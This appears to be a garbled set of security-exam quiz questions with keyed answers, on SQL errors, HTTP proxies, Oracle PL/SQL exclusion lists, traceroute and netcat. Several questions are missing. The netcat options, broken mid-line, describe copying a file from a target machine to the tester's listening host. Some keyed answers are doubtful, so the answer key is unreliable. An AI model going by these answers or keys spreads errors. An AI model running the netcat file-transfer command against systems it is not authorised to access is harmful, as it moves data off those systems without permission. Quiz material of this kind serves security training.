correct: It is a MS-SQL server whoch states for an incorrect syntax near keyword.

question: What kind of problem can arise when a HTTP-Proxy allows only using plain text?

correct: There will be a problem if the form is not sent with "application/x-www-form-urlencoded".

question: Oracle introduced the PLSQLExclusionList, what answer is correct?

correct: Direct attempts to access this package would result in a " 403 Forbidden" response.

question: In the last transaction by tracroute, the containing TTL answers ICMP Time Exceeded. What answer is true?
given: The Server sends an ICMP Time Exceeded message back to the source
The Router sends an ICMP Host Unreachable back to the source.
The Client sends an ICMP Time Exceeded message back to the source.
The Router decrements TTL values of packets by one when routing and discard packets whose TTL value has reached zero.
The Server sends an ICMP Host Unreachable back to the source.
correct: The Router decrements TTL values of packets by one when routing and discard packets whose TTL value has reached zero

given: On your host run "nc - l 80 > out.txt", and on the target run "type file.txt
nc - l 80 ", and on the target run "nc - l 80 "
On your host run "nc <target> 80 > out.txt", and on the target run "nc - p file.txt - v 80 "
On your host run "nc - r 80 > out.txt", and on the target run "more file.txt
On your host run "nc - l 80 > out.txt", and on the target run "nc - r file.txt <yourhost> 80 "
correct: On your host run "nc - l 80 > out.txt", and on the target run "type file.txt
